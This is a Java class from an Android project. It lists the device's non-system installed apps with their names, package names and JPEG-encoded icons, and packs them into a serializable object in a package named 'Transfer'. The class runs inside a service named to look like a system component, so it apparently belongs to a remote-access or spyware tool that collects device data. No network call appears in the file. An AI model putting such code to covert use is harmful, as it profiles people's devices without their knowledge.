package Transfer;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.drawable.BitmapDrawable;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import static android.content.pm.PackageManager.GET_META_DATA;

public class InstalledApps implements Serializable {

  public List<InstalledApp> INSTALLEDAPPS;

  public InstalledApps() {
    INSTALLEDAPPS = new ArrayList();

    try {
      PackageManager packageManager = MyService.context.getPackageManager();
      for (ApplicationInfo applicationInfo : packageManager.getInstalledApplications(
          GET_META_DATA)) {
        if ((applicationInfo.flags & 1) != 1) {
          InstalledApp installedApp = new InstalledApp();
          installedApp.NAME = packageManager.getApplicationLabel(applicationInfo).toString();
          installedApp.PKGNAME = applicationInfo.packageName;

          ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
          Bitmap.createScaledBitmap(
              ((BitmapDrawable) packageManager.getApplicationIcon(applicationInfo)).getBitmap(),
              150, 150, true).compress(CompressFormat.JPEG, 100, byteArrayOutputStream);
          installedApp.ICON = byteArrayOutputStream.toByteArray();
          INSTALLEDAPPS.add(installedApp);
        }
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
